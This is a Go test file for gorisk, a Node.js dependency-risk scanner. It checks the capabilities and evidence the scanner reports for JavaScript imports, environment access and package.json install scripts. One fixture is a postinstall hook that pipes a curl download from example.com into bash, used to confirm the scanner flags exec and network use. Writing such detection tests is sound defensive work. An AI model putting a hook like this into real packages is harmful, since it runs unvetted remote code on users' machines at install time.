package node

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/1homsi/gorisk/internal/capability"
)

func writeTempJSFile(t *testing.T, dir, name, src string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(src), 0600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestScanFileRequireEvidence(t *testing.T) {
	dir := t.TempDir()
	src := `const fs = require('fs');
const result = fs.readFileSync('foo.txt');
`
	writeTempJSFile(t, dir, "test.js", src)

	var caps capability.CapabilitySet
	scanFile(filepath.Join(dir, "test.js"), &caps)

	if !caps.Has(capability.CapFSRead) && !caps.Has(capability.CapFSWrite) {
		t.Errorf("expected fs capability, got: %v", caps.List())
	}
	evs := caps.Evidence[capability.CapFSRead]
	if len(evs) == 0 {
		evs = caps.Evidence[capability.CapFSWrite]
	}
	if len(evs) == 0 {
		t.Fatal("expected at least one evidence entry for fs via require")
	}
	ev := evs[0]
	if ev.Via != "import" {
		t.Errorf("expected Via=import, got %q", ev.Via)
	}
	if ev.Confidence != 0.90 {
		t.Errorf("expected Confidence=0.90, got %f", ev.Confidence)
	}
	if ev.Line != 1 {
		t.Errorf("expected Line=1, got %d", ev.Line)
	}
	if ev.File == "" {
		t.Error("expected non-empty File in evidence")
	}
}

func TestScanFileImportFromEvidence(t *testing.T) {
	dir := t.TempDir()
	src := `import { exec } from 'child_process';
`
	writeTempJSFile(t, dir, "test.ts", src)

	var caps capability.CapabilitySet
	scanFile(filepath.Join(dir, "test.ts"), &caps)

	if !caps.Has(capability.CapExec) {
		t.Errorf("expected exec capability, got: %v", caps.List())
	}
}

func TestScanFileDynamicImportAddsPlugin(t *testing.T) {
	dir := t.TempDir()
	src := `const m = await import('some-module');
`
	writeTempJSFile(t, dir, "test.mjs", src)

	var caps capability.CapabilitySet
	scanFile(filepath.Join(dir, "test.mjs"), &caps)

	if !caps.Has(capability.CapPlugin) {
		t.Errorf("expected plugin capability from dynamic import, got: %v", caps.List())
	}
}

func TestScanFileCallSiteEvidence(t *testing.T) {
	dir := t.TempDir()
	// Use a pattern from node.yaml callSites
	src := `process.env.SECRET;
`
	writeTempJSFile(t, dir, "test.js", src)

	var caps capability.CapabilitySet
	scanFile(filepath.Join(dir, "test.js"), &caps)

	if !caps.Has(capability.CapEnv) {
		// Might not have env if process.env isn't in callSites — skip gracefully
		t.Skipf("process.env not in callSites patterns, got: %v", caps.List())
	}
	evs := caps.Evidence[capability.CapEnv]
	for _, ev := range evs {
		if ev.Via == "callSite" && ev.Confidence == 0.60 {
			return // found expected evidence
		}
	}
	t.Errorf("expected callSite evidence with confidence=0.60 for env, got: %+v", evs)
}

func TestCheckInstallScriptsEvidence(t *testing.T) {
	dir := t.TempDir()
	pkgJSON := `{
  "name": "test",
  "scripts": {
    "postinstall": "curl https://example.com/setup.sh | bash"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkgJSON), 0600); err != nil {
		t.Fatal(err)
	}

	var caps capability.CapabilitySet
	checkInstallScripts(dir, &caps)

	if !caps.Has(capability.CapExec) || !caps.Has(capability.CapNetwork) {
		t.Errorf("expected exec+network from install script, got: %v", caps.List())
	}

	evs := caps.Evidence[capability.CapExec]
	if len(evs) == 0 {
		t.Fatal("expected evidence for exec from install script")
	}
	ev := evs[0]
	if ev.Via != "installScript" {
		t.Errorf("expected Via=installScript, got %q", ev.Via)
	}
	if ev.Confidence != 0.85 {
		t.Errorf("expected Confidence=0.85, got %f", ev.Confidence)
	}
	if ev.File != "package.json" {
		t.Errorf("expected File=package.json, got %q", ev.File)
	}
}

func TestScanFileLineNumbers(t *testing.T) {
	dir := t.TempDir()
	src := `// line 1
// line 2
const net = require('net');
`
	writeTempJSFile(t, dir, "test.js", src)

	var caps capability.CapabilitySet
	scanFile(filepath.Join(dir, "test.js"), &caps)

	for _, cap := range []string{capability.CapNetwork} {
		evs := caps.Evidence[cap]
		for _, ev := range evs {
			if ev.Via == "import" && ev.Line != 3 {
				t.Errorf("expected Line=3 for %s import, got %d", cap, ev.Line)
			}
		}
	}
}
